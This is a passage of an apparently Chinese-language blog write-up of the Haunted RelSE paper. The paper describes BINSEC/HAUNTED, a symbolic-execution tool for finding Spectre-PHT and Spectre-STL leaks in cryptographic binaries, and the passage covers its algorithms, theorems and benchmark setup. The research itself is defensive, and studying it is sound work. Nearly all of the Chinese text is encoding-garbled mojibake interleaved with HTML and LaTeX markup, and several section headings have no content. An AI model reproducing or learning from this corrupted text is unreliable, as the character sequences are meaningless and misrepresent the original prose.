ï¼šä¸€ä¸ªæ¡ä»¶åˆ†æ”¯åçš„æ¨æµ‹è·¯å¾„æ˜¯åŠ¨æ€è®¡ç®—çš„ï¼Œè€ƒè™‘å½“å…¶æ‰€ä¾èµ–çš„æ‰€æœ‰å†…å­˜è®¿é—®éƒ½å¤±æ•ˆæ—¶ï¼Œä¸€ä¸ªæ¡ä»¶å¯ä»¥è¢«å®Œå…¨è§£å‡ºï¼ˆä¸”é¢„æµ‹é”™è¯¯çš„è·¯å¾„å¯ä»¥è¢«å»é™¤ï¼‰ï¼Œè¿™æ„å‘³ç€è‹¥è¯¥æ¡ä»¶å¹¶ä¸ä¾èµ–äºå†…å­˜ï¼Œåˆ™åˆ†æ”¯å¹¶æœªé¢„æµ‹é”™è¯¯</p><p>è¿™éœ€è¦ä¸ºæ¯ä¸ªè¡¨è¾¾å¼ä¿å­˜å…¶æœ€åå†…å­˜è®¿é—®çš„æ·±åº¦ï¼Œå¦‚ <code>Algorithm 1</code> æ‰€ç¤ºï¼Œåœ¨ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯ä¸Šï¼Œ $ite\ c\ ?l <em>{true}:l</em>{false}$ è¢«è®¡ç®—ä¸ºä¸€ä¸ªç¬¦å·å€¼ $\widehat{\varphi}$ ä¸æ·±åº¦ $\delta$ ï¼Œè¯¥æ·±åº¦ $\delta$ è¢«ä½œä¸ºæ¡ä»¶çš„é€€å‡ºæ·±åº¦è€Œæ·»åŠ åˆ°æ¨æµ‹è·¯å¾„è°“è¯­  $\widetilde{\pi}$  ä¸­</p><p><em>3) Invalidate transient paths</em> ï¼šåœ¨ <code>Algorithm 2</code> ä¸­ï¼Œæ¡ä»¶åˆ†æ”¯åœ¨å‡½æ•° $retirePHT(\pi,\widetilde{\pi},\delta)$ ä¸­å¤±æ•ˆï¼Œè¯¥å‡½æ•°ä»æ¨æµ‹è·¯å¾„è°“è¯­ $\widetilde{\pi}$ ä¸­ç§»é™¤æ‰€æœ‰å¸¦æœ‰å°äºå½“å‰æ·±åº¦ $\delta _{current}$ çš„å¤±æ•ˆæ·±åº¦ $\delta _{ret}$ çš„æ¡ä»¶ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°å¤±æ•ˆè·¯å¾„è°“è¯­ $\pi$ ä¸­ï¼Œå¹¶è¿”å›æ›´æ–°åçš„è·¯å¾„è°“è¯­  $\pi$ ä¸ $\widetilde{\pi}$ ï¼›è‹¥  $\pi$ ä¸å¯æ»¡è¶³ï¼Œåˆ™ç¬¦å·æ‰§è¡Œå°†åœæ­¢</p><p><img src="https://s2.loli.net/2023/01/27/tl29pvOeFdrBTGj.png" alt="image.png"></p><h3 id="B-Haunted-RelSE-for-Spectre-STL"><a href="#B-Haunted-RelSE-for-Spectre-STL" class="headerlink" title="B. Haunted RelSE for Spectre-STL"></a>B. Haunted RelSE for Spectre-STL</h3><p><em>1) Symbolic memory</em> ï¼šåœ¨ä¸€ä¸ªç¬¦å·é…ç½®ä¸­ï¼Œå†…å­˜ $\widehat{\mu}$ ä¸ºä»åˆå§‹å†…å­˜å¼€å§‹çš„ç¬¦å·åŒ– store æ“ä½œçš„å†å²ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªæŒ‰æ—¶é—´é¡ºåºçš„è¡¨ç¤ºæ¥é‡æ–°æ„é€  <em>store buffer</em> ä¸ <em>main memory</em> çš„å†…å®¹ï¼›store buffer ä¹Ÿæ˜¯å¯¹ç¬¦å·åŒ–å†…å­˜çš„æœ€å <code>|SB|</code> æ¡æœªå¤±æ•ˆ store çš„é™åˆ¶ï¼Œå…¶ä¸­ <code>|SB|</code> ä¸º store buffer çš„å¤§å°ï¼Œå½¢å¼ä¸Šå…¶è¢«å®šä¹‰ä¸ºï¼š</p><p><img src="https://s2.loli.net/2023/01/27/Xt352nyMkC8R6vO.png" alt="image.png"></p><p>å…¶ä¸­ $last(n,\widehat{\mu})$ ä¸ºç¬¦å·åŒ–å†…å­˜ $\widehat{\mu}$ çš„æœ€å $n$ ä¸ªå…ƒç´ </p><p>ç±»ä¼¼åœ°ï¼Œ <em>ä¸»å­˜</em> ï¼ˆmain memoryï¼‰è¢«å®šä¹‰ä¸ºç¬¦å·åŒ–å†…å­˜å †å¤±æ•ˆçš„ store æ“ä½œçš„é™åˆ¶ï¼Œå½¢å¼ä¸Šå®šä¹‰ä¸º $Mem(\widehat{\mu},\delta)\triangleq\widehat{\mu}\backslash SB(\widehat{\mu},\delta)$</p><p>å¯¹ä¸€ä¸ª store æŒ‡ä»¤çš„è¯„ä¼°å¦‚ <code>Algorithm 3</code> æ‰€ç¤ºï¼Œé¦–å…ˆè¯¥å‡½æ•°ä¼šè®¡ç®—ä¸‹æ ‡çš„ç¬¦å·å€¼å¹¶ç¡®è®¤å…¶å¯ä»¥åœ¨ <em>å¸¸è§„è·¯å¾„è°“è¯­</em> $\pi _{reg}$ ä¸‹è¢«å®‰å…¨åœ°æ³„éœ²ï¼ˆå³ï¼Œå¤±æ•ˆè·¯å¾„è°“è¯­ $\pi$ ä¸æ‰€æœ‰ $\widetilde{\pi}$ ä¸­çš„æœªå†³çš„æ¡ä»¶çš„ç»“åˆï¼ŒåŠ ä¸Š $\lambda$ ä¸­å¤±æ•ˆçš„ transient loads ï¼‰ï¼Œæ¥ä¸‹æ¥å…¶ä½¿ç”¨ä¸€ä¸ªç¬¦å·åŒ–çš„ store æ“ä½œæ¥æ›´æ–°ç¬¦å·åŒ–å†…å­˜å¹¶å°†è¯¥ store çš„å¤±æ•ˆæ·±åº¦è®¾ä¸º $\delta + \Delta$ï¼Œè¯¥å¤±æ•ˆæ·±åº¦ç”¨ä»¥ç¡®è®¤ store buffer ä¸­çš„å“ªä¸€ä¸ª store æ“ä½œåœ¨ç­‰å¾…ä¸­ã€å“ªä¸€ä¸ªå·²ä½œç”¨äºä¸»å­˜ä¸Š</p><p><img src="https://s2.loli.net/2023/01/28/HnTcajkiSudZODv.png" alt="image.png"></p><p><em>2) Evaluation of load expressions</em> ï¼šload è¡¨è¾¾å¼å¯ä»¥é€šè¿‡ <em>store-to-load forwarding</em> ä» store buffer ä¸­è·å–ä¸€ä¸ªå¸¦æœ‰åŒ¹é…åœ°å€çš„æœªå†³çš„ storeï¼Œä¹Ÿå¯ä»¥æ¨æµ‹æ€§åœ°ç»•è¿‡ store buffer ä¸­æœªå†³çš„ store å¹¶ä»ä¸»å­˜å–å€¼ï¼›ç›¸è¾ƒäºè€ƒè™‘ä¸€ä¸ª load è¡¨è¾¾å¼ä¸ store buffer ä¸­å…ˆå‰æ‰€æœ‰çš„ store ä¹‹é—´çš„äº¤ç»‡éƒ¨åˆ†ï¼Œç ”ç©¶è€…é€‰ç”¨ <em>read-over-write</em> æ¥è¾¨è¯†ä¸ä¸¢å¼ƒå¤§éƒ¨åˆ†çš„ load ä¸ å…ˆå‰çš„ store è‡ªç„¶åœ° commute çš„æƒ…å†µï¼› <em>Read-over-write</em> ä¸ºä¸€ä¸ªè‘—åçš„å¯¹æ•°ç»„ç†è®ºçš„ç®€åŒ–ï¼Œå…¶åœ¨æ±‚è§£å™¨ä¹‹å‰è§£å‡ºäº†ç¬¦å·åŒ–æ•°ç»„çš„ select æ“ä½œ</p><p>ä¸ºäº†é«˜æ•ˆåœ°å¯¹æ¯”ä¸‹æ ‡ï¼Œread-over-write ä¾èµ–äº <em>è¯­æ³•é¡¹ç­‰ä»·æ€§</em> ï¼ˆsyntactic term equalityï¼‰ï¼Œæ¯”è¾ƒå‡½æ•° $eq^{äº•} (i,j)$ ä»…åœ¨ $i$ ä¸ $j$ åœ¨è¯­æ³•ä¸Šç›¸ç­‰&#x2F;ä¸ç­‰æ—¶è¿”å› true&#x2F;falseï¼Œè‹¥é¡¹ä¹‹é—´æ— æ³•è¿›è¡Œæ¯”è¾ƒï¼Œåˆ™ä¸ºæœªå®šä¹‰ï¼Œè¡¨ç¤ºä¸º $âŠ¥$</p><blockquote><p>å…¬å¼é‡Œçš„è¿™ä¸ª <code>#</code> ä¸æ‡‚ä¸ºå•¥è€æ˜¯æ¸²æŸ“é”™è¯¯ï¼Œåªèƒ½ç”¨ <code>äº•</code> æ›¿ä»£ä¸€ä¸‹ï¼š( </p></blockquote><p>ä¸ºäº†é«˜æ•ˆåœ°åœ¨æ±‚è§£å™¨ä¹‹å‰è§£å‡º select æ“ä½œï¼Œread-over-write å®šä¹‰äº†ä¸€ä¸ªä¾èµ–äºä»¥ä¸‹è¯­æ³•é¡¹ç­‰ä»·æ€§çš„ $lookup _{mem}$ å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2023/01/28/5t1P2KsjeJirdFz.png" alt="image.png"></p><p>å…¶ä¸­ $\widehat{\mu _{n}} \triangleq store(\widehat{\mu} _{n-1} , j, \widehat{\varphi})$</p><p>ä¾‹å¦‚è€ƒè™‘è¿™æ ·çš„ä¸€ä¸ªå†…å­˜ $\widehat{\mu}$ ï¼š</p><p><img src="https://s2.loli.net/2023/01/28/s49Iic8LEz5hfO3.png" alt="image.png"></p><ul><li>$lookup _{mem}(\widehat{\mu},ebp - 8)$ è¿”å› $\widehat{\varphi}$</li><li>$lookup _{mem}(\widehat{\mu},ebp - 4)$ é¦–å…ˆä¼šæ¯”è¾ƒ $ebp - 4$ ä¸ $ebp - 8$ å¹¶ç¡®è®¤ä»–ä»¬æ˜¯ <em>è¯­ä¹‰ä¸ç­‰çš„</em> ï¼ˆsyntactically distinctï¼Œå³ $\lnot eq^(ebp - 4, eax) &#x3D; \perp$ï¼‰ï¼Œå› æ­¤ $select$ æ“ä½œå¹¶ä¸èƒ½è¢«ç®€åŒ–</li></ul><p>ä¸ºäº†é«˜æ•ˆåœ°å»ºæ¨¡ store-to-load forwardingï¼Œç ”ç©¶è€…å®šä¹‰äº†ä¸€ä¸ª <code>Algorithm 4</code>  ä¸­æ‰€ç¤ºçš„æ–°å‡½æ•° $lookup _{SB}$ï¼Œå…¶è¿”å› store buffer ä¸­ä¸€ç»„åŒ¹é…çš„ storeï¼›æ­¤å¤–ï¼Œ$lookup _{SB}$ æ¯ä¸ª load å¿…é¡»è¦è¢«å¤±æ•ˆåŒ–çš„æ·±åº¦ï¼Œå³å¯¹äºç›¸åŒåœ°å€çš„ä¸€ä¸ªæœ€è¿‘çš„ store çš„å¤±æ•ˆæ·±åº¦</p><p><img src="https://s2.loli.net/2023/01/28/MKj5Ln9BG1xJ3IH.png" alt="image.png"></p><p>æœ€ç»ˆç ”ç©¶è€…å®šä¹‰äº† <code>Algorithm 5</code> ä¸­æ‰€ç¤ºå‡½æ•° $lookup _{ite} (\widehat{\mu},i,\widetilde{\lambda},\delta)$ ï¼Œå…¶å°† $lookup _{SB}$ çš„ç»“æœç¼–ç ä¸ºä¸€ä¸ªç¬¦å·åŒ–çš„ä½¿ç”¨æ–°çš„å¸ƒå°”å˜é‡çš„ if-then-else è¡¨è¾¾å¼ï¼›è¯¥å‡½æ•°è¿”å› load è¡¨è¾¾å¼çš„å€¼ï¼Œå¹¶å°†è¿‡ç¨‹ä¸­å®šä¹‰çš„å¸ƒå°”å˜é‡æ·»åŠ åˆ° $\widetilde{\lambda}$ ä¸­ï¼›æ­¤å¤–ï¼Œä¸ºäº†å®ç° $BINSEC&#x2F;HAUNTED$ ï¼Œç ”ç©¶è€…ä½¿ç”¨å¸ƒå°”å˜é‡çš„åå­—æ¥ç¼–ç å…³äº load ä¸å‰é¢çš„ store çš„ä½ç½®çš„ä¿¡æ¯ï¼›å› æ­¤ï¼Œæˆ‘ä»¬æœ‰å¯èƒ½ä½¿ç”¨æ±‚è§£å™¨è¿”å›çš„åä¾‹æ¥å¾—çŸ¥è§¦å‘æ¼æ´æ˜¯ç»•è¿‡äº†å“ªä¸€ä¸ª storeï¼Œè¿™æœ‰åŠ©äºæˆ‘ä»¬äº†è§£æ¼æ´å¹¶é‡æ„æ”»å‡»å›¾</p><p><img src="https://s2.loli.net/2023/01/28/Bq6ouwNsAkh2Ytz.png" alt="image.png"></p><p>å¯¹ä¸€ä¸ª load æŒ‡ä»¤çš„è¯„ä¼°å¦‚ <code>Algorithm 6</code> æ‰€ç¤ºï¼Œé¦–å…ˆè¯¥å‡½æ•°ä¼šè®¡ç®—ä¸‹æ ‡çš„ç¬¦å·å€¼å¹¶ç¡®è®¤å…¶å¯ä»¥è¢«å®‰å…¨åœ°æ³„éœ²ï¼Œæ¥ä¸‹æ¥å…¶ä¼šè°ƒç”¨ $lookup _{ite}$ è·å¾— load æŒ‡ä»¤å¯ä»¥å–çš„ç¬¦å·å€¼çš„é›†åˆï¼Œç¼–ç ä¸ºä¸€ä¸ªå•ç‹¬çš„ if-then-else è¡¨è¾¾å¼ $\widehat{\iota}$ ï¼Œå¹¶æ›´æ–° transient load çš„é›†åˆ $\widetilde{\lambda}$ ï¼›æœ€åå…¶ä¼šä½¿ç”¨ load çš„å€¼æ›´æ–°å¯„å­˜å™¨æ˜ å°„å¹¶å°†å…¶å¤±æ•ˆæ·±åº¦è®¾ä¸º $\delta + \Delta$ ï¼›å¤±æ•ˆæ·±åº¦ä¼šåœ¨æ¥ä¸‹æ¥çš„å¯¹æ¡ä»¶åˆ†æ”¯çš„è¯„ä¼°ä¸­ä½¿ç”¨ï¼Œä»¥ç¡®å®šè¯¥æ¡ä»¶æ˜¯å¦å†³å®šäºå†…å­˜</p><p><img src="https://s2.loli.net/2023/01/28/i2ous4LrlWd8vUg.png" alt="image.png"></p><p><em>3) Invalidate transient loads</em> ï¼šå½“æ›´å¤šçš„æœ€è¿‘çš„åŒ¹é…çš„ store éƒ½é€šè¿‡è®¾ç½®å¯¹åº”çš„å¸ƒå°”å˜é‡ä¸º false è€Œå¤±æ•ˆäº†ï¼Œtransient load çš„å€¼å¯ä»¥è¢«æ— æ•ˆåŒ–ï¼›äº <code>Algorithm 7</code> ä¸­å®šä¹‰çš„å‡½æ•° $retireSTL(\pi,\widetilde{\lambda},\delta)$ ä» transient load çš„é›†åˆ $\widetilde{\lambda}$ ä¸­ç§»é™¤æ‰€æœ‰çš„å¸¦æœ‰åœ¨ $\delta$ ä¸‹çš„å¤±æ•ˆæ·±åº¦çš„ loadï¼Œå¹¶åœ¨è·¯å¾„è°“è¯­ $\pi$ ä¸­å°†ç›¸åº”çš„å¸ƒå°”å˜é‡è®¾ä¸º falseï¼›ä¸ºäº†å¯è¯»æ€§ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼•å…¥ä¸€ä¸ªé€šè¿‡åŒæ—¶ä½¿ç”¨ $retirePHT$ ä¸ $retireSTL$ ä»¥åœæ­¢æ‰€æœ‰æ¨æµ‹çš„å‡½æ•° $retireALL$ </p><p><img src="https://s2.loli.net/2023/01/28/7Nqnw9sDomUP4Qh.png" alt="image.png"></p><h3 id="C-Theorems"><a href="#C-Theorems" class="headerlink" title="C. Theorems"></a>C. Theorems</h3><p>æœ¬èŠ‚ç ”ç©¶è€…å°†è¯æ˜ Haunted RelSE å¯¹äº SCT çš„æ­£ç¡®æ€§ä¸å®Œå¤‡æ€§ï¼ˆè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œï¼‰ï¼Œè¿™æ„å‘³ç€å½“ Haunted RelSE æŠ¥å‘Šäº†ä¸€ä¸ªè¿è§„ï¼ˆviolationï¼‰ï¼Œå…¶ä¸ºä¸€ä¸ªçœŸæ­£çš„ SCT è¿è§„ï¼ˆæ²¡æœ‰ä¸Šè¿‘ä¼¼ï¼‰ï¼Œä¸”å½“å…¶åœ¨æ·±åº¦ k ä¸ŠæŠ¥å‘Šæ²¡æœ‰è¿è§„æ—¶ï¼Œè¯¥ç¨‹åºåœ¨æ·±åº¦ k ä¸Šæ˜¯å®‰å…¨çš„ï¼ˆæ²¡æœ‰ä¸‹è¿‘ä¼¼ï¼‰ï¼›ä¸ºæ­¤ï¼Œç ”ç©¶è€…è¯æ˜äº† Haunted RelSE ä¸ Explicit RelSE æ˜¯ç­‰ä»·çš„ï¼Œä¸”å±•ç¤ºäº† Explicit RelSE å¯¹äºè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œï¼ˆup-to-an-unrolling-boundï¼‰çš„ SCT è€Œè¨€åœ¨ä¸Šæ˜¯æ­£ç¡®ä¸”å®Œå¤‡çš„</p><p><strong>Theorem 1.</strong> <em>Explicit RelSE å¯¹äºè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œçš„æ¨æµ‹å¸¸æ•°æ—¶é—´è€Œè¨€åœ¨æ˜¯æ­£ç¡®ä¸”å®Œå¤‡çš„</em></p><p>$Proof(sketch).$ è¯¥è¯æ˜ä¸ºä¸€ä¸ªç®€å•çš„å¯¹ RelSE å¯¹å¸¸æ•°æ—¶é—´çš„æ­£ç¡®æ€§ä¸å®Œå¤‡æ€§çš„è¯æ˜å¯¹æ¨æµ‹æ€§è¯­ä¹‰ï¼ˆspeculative semanticsï¼‰çš„æ‰©å±•ï¼›è¯¥æ‰©å±•éœ€è¦å±•ç¤ºï¼š</p><ul><li>1ï¼‰åœ¨ç¬¦å·æ‰§è¡Œä¸­ç¬æ€è·¯å¾„ä¸ŠæŠ¥å‘Šçš„è¿è§„å¯¹åº”åˆ°å…·ä½“ç¬æ€æ‰§è¡Œä¸­çš„è¿è§„</li><li>2ï¼‰è‹¥åœ¨å…·ä½“ç¬æ€æ‰§è¡Œä¸­æœ‰ä¸€ä¸ªè¿è§„ï¼Œåˆ™åœ¨ç¬¦å·æ‰§è¡Œä¸­æœ‰ä¸€ä¸ªè·¯å¾„ä¼šæŠ¥å‘Šè¯¥è¿è§„</li></ul><p>æ¥ä¸‹æ¥ç ”ç©¶è€…å°†å±•ç¤º Haunted RelSE ä¸ Explicit RelSE ç­‰ä»·</p><p><strong>Theorem 2.</strong> ï¼ˆEquivalence Explicit and Haunted RelSEï¼‰ <em>Haunted RelSE æ£€æµ‹åˆ°äº†ä¸€ä¸ªè¿è§„å½“ä¸”ä»…å½“ Explicit RelSE æ£€æµ‹åˆ°äº†ä¸€ä¸ªè¿è§„</em>  </p><p>åœ¨ <code>Appendix B</code> ä¸­ç ”ç©¶è€…ç»™å‡ºäº†ä¸€ä¸ªè¯æ˜è‰å›¾ï¼Œå…¶é¦–å…ˆå±•ç¤ºäº† Spectre-PHT çš„ç†è®ºï¼šåœ¨ä¸€ä¸ªæ¡ä»¶åˆ†æ”¯åï¼ŒHaunted RelSE æ¢ç´¢çš„ä¸¤æ¡è·¯å¾„å®Œå…¨åœ°è·å–äº† Explicit RelSE ä¸­æ¢ç´¢çš„å››æ¡è·¯å¾„çš„è¡Œä¸ºï¼›ç ”ç©¶è€…æ¥ä¸‹æ¥å±•ç¤º Spectre-STL çš„ç†è®ºï¼šåœ¨ä¸€æ¡ load æŒ‡ä»¤ä¹‹åï¼ŒHaunted RelSE äº§ç”Ÿçš„å•æ¡è·¯å¾„å®Œå…¨è·å¾—äº† Explicit RelSE ä¸­å¤šæ¡è·¯å¾„çš„è¡Œä¸º</p><p><strong>Corollary 1.</strong> <em>Haunted RelSE å¯¹äºè¾¾åˆ°ä¸€ä¸ªå±•å¼€è¾¹ç•Œçš„æ¨æµ‹å¸¸æ•°æ—¶é—´è€Œè¨€åœ¨æ˜¯æ­£ç¡®ä¸”å®Œå¤‡çš„</em> </p><h3 id="D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE"><a href="#D-BINSEC-x2F-HAUNTED-a-tool-for-Haunted-RelSE" class="headerlink" title="D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE"></a>D. BINSEC&#x2F;HAUNTED, a tool for Haunted RelSE</h3><p>ç ”ç©¶è€…åŸºäºäºŒè¿›åˆ¶çº§çš„åˆ†æå™¨ BINSEC å®ç°äº† Haunted RelSE å¹¶ç§°ä¹‹ä¸º <code>BINSEC/HAUNTED</code> ï¼Œå…¶è·å–ä¸€ä¸ª x86 å¯æ‰§è¡Œæ–‡ä»¶ã€ç§˜å¯†è¾“å…¥çš„ä½ç½®ã€ä¸€ä¸ªåˆå§‹å†…å­˜é…ç½®ï¼ˆé€šå¸¸ä¸ºå®Œå…¨ç¬¦å·åŒ–çš„ï¼‰ã€æ¨æµ‹çš„æ·±åº¦ã€store buffer çš„å¤§å°ä½œä¸ºè¾“å…¥ï¼›BINSEC&#x2F;HAUNTED ä»¥æ·±åº¦ä¼˜å…ˆæœç´¢å¯¹ç¨‹åºè¿›è¡Œæ¢ç´¢ï¼Œä¼˜å…ˆå¤„ç†ç¬æ€è·¯å¾„ï¼Œå¹¶å¸¦ç€åä¾‹ï¼ˆå³ï¼Œå¯¼è‡´äº†æŸåçš„åˆå§‹é…ç½®ä¸æ¨æµ‹é€‰é¡¹ï¼‰æŠ¥å‘Š SCT æŸåï¼›å…¶ä½¿ç”¨å½“å‰ä½å‘é‡ç†è®ºä¸Šæœ€å¥½çš„ SMT æ±‚è§£å™¨ <code>Boolector</code></p><h1 id="0x05-EXPERIMENTAL-EVALUATION"><a href="#0x05-EXPERIMENTAL-EVALUATION" class="headerlink" title="0x05. EXPERIMENTAL EVALUATION"></a>0x05. EXPERIMENTAL EVALUATION</h1><p>ç ”ç©¶è€…åœ¨æœ¬è®ºæ–‡ä¸­å›ç­”äº†è¿™äº›ç ”ç©¶é—®é¢˜ï¼š</p><p><strong>RQ 1 Effectiveness.</strong> BINSEC&#x2F;HAUNTED æ˜¯å¦èƒ½å¤Ÿåœ¨çœŸå®ä¸–ç•Œçš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å‘ç° Spectre-PHT ä¸ Spectre-STL æŸåï¼Ÿ</p><p><strong>RQ2 Haunted vs Explicit.</strong> Haunted RelSE ä¸ Explicit RelSE å¯¹æ¯”èµ·æ¥å¦‚ä½•ï¼Ÿ</p><p><strong>RQ3 BINSEC&#x2F;HAUNTED vs. SoA tools.</strong> BINSEC&#x2F;Haunted ä¸æœ€å…ˆè¿›çš„å·¥å…·æ¯”èµ·æ¥å¦‚ä½•ï¼Ÿ</p><p>ä¸ºäº†å›ç­” RQ1 ä¸ RQ2ï¼Œç ”ç©¶è€…å¯¹æ¯”äº† <em>Explicit</em> ä¸ <em>Haunted</em> ç”¨ä»¥å…³ç³»ç¬¦å·æ‰§è¡Œçš„æ¢ç´¢ç­–ç•¥çš„æ€§èƒ½â€”â€”ä¸¤è€…éƒ½åº”ç”¨äº BINSEC&#x2F;HAUNTED â€”â€”åœ¨ä¸€ç»„çœŸå®ä¸–ç•Œå¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸ litmus benchmarkï¼ˆSections V-B ä¸ V-Cï¼‰ï¼›ä¸ºäº†å›ç­” RQ3ï¼Œç ”ç©¶è€…å¯¹æ¯”äº† BINSEC&#x2F;HAUNTED ä¸æœ€å…ˆè¿›çš„å·¥å…· KLEESpectre ä¸ Pitchforkï¼ˆSection V-Dï¼‰</p><p><strong>Legend.</strong> æœ¬èŠ‚ä¸­ï¼Œ$I _{x86}$ ä¸ºè¢«æ¢ç´¢çš„ä¸åŒ x86 æŒ‡ä»¤çš„æ•°é‡ï¼Œ $P$ ä¸ºæ¢ç´¢çš„è·¯å¾„æ•°é‡ï¼Œ$T$ ä¸ºæ€»çš„æ‰§è¡Œæ—¶é—´ï¼Œ<code>ä¸€ä¸ªè™«å­ç¬¦å·</code> ï¼ˆæ‰“ä¸å‡ºæ¥ï¼‰ä¸ºå‘ç°çš„æ¼æ´æ•°é‡ï¼Œâ³ä¸ºè¶…æ—¶æ•°é‡ï¼Œâœ“ ä¸ºè¢«è¯æ˜å®‰å…¨çš„ç¨‹åºæ•°é‡ï¼ŒÃ— ä¸ºè¢«è¯æ˜ä¸å®‰å…¨çš„ç¨‹åºæ•°é‡</p><h3 id="A-benchmark"><a href="#A-benchmark" class="headerlink" title="A. benchmark"></a>A. benchmark</h3><p>ç ”ç©¶è€…åœ¨ä¸€å°å¸¦æœ‰ <code>Intel(R) Xeon(R) CPU E3-1505M v6 @ 3.00GHz </code> å¤„ç†å™¨ä¸ 32GB å†…å­˜çš„æœºå™¨ä¸Šè¿›è¡Œå®éªŒï¼Œé™¤äº†åˆå§‹æ ˆæŒ‡é’ˆ $esp$ ä»¥å¤–ï¼ˆç±»ä¼¼äºrelated work[5]ï¼‰æ‰€æœ‰çš„è¾“å…¥éƒ½æ˜¯ç¬¦å·çš„ï¼Œä¸”æ•°æ®ç»“æ„ä¸ºé™æ€åˆ†é…çš„ï¼›ç”¨æˆ·éœ€è¦æ ‡è®°ç§˜å¯†ï¼Œå…¶ä½™æ‰€æœ‰çš„å€¼éƒ½æ˜¯å…¬å¼€çš„ï¼›ç ”ç©¶è€…å°†æ¨æµ‹æ·±åº¦è®¾ç½®ä¸º 200 æ¡æŒ‡ä»¤å¹¶å°† store buffer çš„å¤§å°è®¾ç½®ä¸º 20 æ¡æŒ‡ä»¤ï¼Œæ­¤å¤–ï¼Œç ”ç©¶è€…ä»…è€ƒè™‘é¡ºåºæ‰§è¡Œä¸­çš„é—´æ¥è·³è½¬ç›®æ ‡å¹¶å®ç°äº†ä¸€ä¸ª <em>å½±å­æ ˆ</em> ä»¥é™åˆ¶è¿”å›æŒ‡ä»¤åœ¨ä¸€ä¸ªåˆé€‚çš„è¿”å›ä½ç½®ï¼›è€ƒè™‘ç¬æ€è·³è½¬ç›®æ ‡éœ€è¦åœ¨ä»»æ„ä½ç½®å»ºæ¨¡é—´æ¥è·³è½¬ï¼Œå¯¹äºç¬¦å·æ‰§è¡Œè€Œè¨€è™½ç„¶å¯è¡Œä½†éå¸¸æ£˜æ‰‹</p><p>ç ”ç©¶è€…é€šè¿‡å¦‚ä¸‹ç¨‹åºè¯„ä¼° BINSEC&#x2F;HAUNTEDï¼š</p><ul><li><code>litmus-pht</code> ï¼š16 ä¸ªæ¥è‡ªäº Pitchfork çš„ä¿®æ”¹è¿‡çš„ Paul Kocher çš„ litmus tests é›†åˆçš„å°çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆlitmus testsï¼‰ç”¨ä»¥ Spectre-PHT</li><li><code>litmus-pht-patched</code> ï¼šæ·»åŠ äº†ä¸‹æ ‡æ©ç ï¼ˆindex maskingï¼‰çš„ <code>litmus-pht</code></li><li><code>litmus-stl</code> ï¼šæ–°çš„ä¸€ç»„ç”¨ä»¥ Spectre-STL çš„ litmus tests</li><li>æ¥è‡ª OpenSSL ä¸ Libsodium å¯†ç å­¦åº“ï¼ˆè¯¦è§ Table Iï¼‰ çš„å¯†ç å­¦åŸè¯­ï¼ŒåŒ…æ‹¬å¹¶æ‰©å±•è‡³åœ¨ <a href="https://doc.libsodium.org/secret-key_cryptography/secretbox">[5]</a> ä¸­è¢«åˆ†æçš„é‚£äº›</li></ul><p>ç¨‹åºä½¿ç”¨ gcc 10.1.0 ç¼–è¯‘åˆ° 32 ä½ x86 æ¶æ„ä¸Šï¼Œlitmus tests è¢«ä»¥ <code>-fno-stack-protector</code> é€‰é¡¹è¿›è¡Œç¼–è¯‘ï¼ŒSpectre-STL çš„ litmus tests é¢å¤–æ·»åŠ äº† <code>-no-pie</code> ä¸ <code>-fno-pic</code> ä»¥æ’é™¤ç”±è¿™äº›é€‰é¡¹å¼•å…¥çš„æŸåï¼ˆå‚è§ Section VIï¼‰ï¼›ç”±äºåŒä¸€åŸå› ï¼Œ<code>donna</code> ä¸ <code>tea</code> ä¸å¸¦æœ‰ <code>-fno-stack-protector</code> ç¼–è¯‘é€‰é¡¹ï¼Œä¼˜åŒ–çº§åˆ«ä¸º <code>O1ã€O2ã€O3</code> ä¸ <code>Ofast</code>ï¼›Libsodium ç”±é»˜è®¤çš„ Makefile è¿›è¡Œç¼–è¯‘ï¼ŒOpenSSL å¼€å¯äº† <code>O3</code> ä¼˜åŒ–ï¼Œä¸¤è€…éƒ½å¼€å¯äº† stack protector</p><p><img src="https://s2.loli.net/2023/01/29/4ZgLHYdQ69ibICM.png" alt="image.png"></p><p><em>Note on Stack Protectors</em> ï¼šç”± stack protector å¼•å…¥çš„è§£å†³é”™è¯¯çš„ä»£ç éå¸¸å¤æ‚ä¸”åŒ…å«äº†è®¸å¤šæ— æ³•åœ¨çº¯å‡€çš„ç¬¦å·æ‰§è¡Œä¸­åˆ†æçš„ç³»ç»Ÿè°ƒç”¨ï¼ŒBINSEC&#x2F;HAUNTED åœ¨ç³»ç»Ÿè°ƒç”¨ä¸Šåœæ­¢è·¯å¾„æ‰§è¡Œä¸”æ¯ä¸ªç¨‹åºä»…è·³è½¬åˆ° stack protector çš„ä»£ç ä¸€æ¬¡ï¼Œè¿™æ„å‘³ç€å…¶å¯èƒ½ä¼šé”™è¿‡ä¸€äº›æœªè¢«æ¢ç´¢çš„ä»£ç ä¸­çš„æŸåï¼›æ­¤å¤–ï¼Œå¯¹äº litmus testsã€<code>tea</code>ã€<code>donna</code>ï¼Œè¶…æ—¶æ—¶é•¿è¢«è®¾ç½®ä¸º 1 å°æ—¶ï¼Œä½†å¯¹äºåŒ…å« stack protector çš„ä»£ç åˆ™å»¶é•¿è‡³ 6 å°æ—¶ï¼ˆLibsodium ä¸ OpenSSLï¼‰</p><h1 id="0x06-NEW-VULNERABILITIES-AND-MITIGATIONS"><a href="#0x06-NEW-VULNERABILITIES-AND-MITIGATIONS" class="headerlink" title="0x06. NEW VULNERABILITIES AND MITIGATIONS"></a>0x06. NEW VULNERABILITIES AND MITIGATIONS</h1><h1 id="0x07-RELATED-WORK"><a href="#0x07-RELATED-WORK" class="headerlink" title="0x07. RELATED WORK"></a>0x07. RELATED WORK</h1><h1 id="0x08-CONCLUTION"><a href="#0x08-CONCLUTION" class="headerlink" title="0x08. CONCLUTION"></a>0x08. 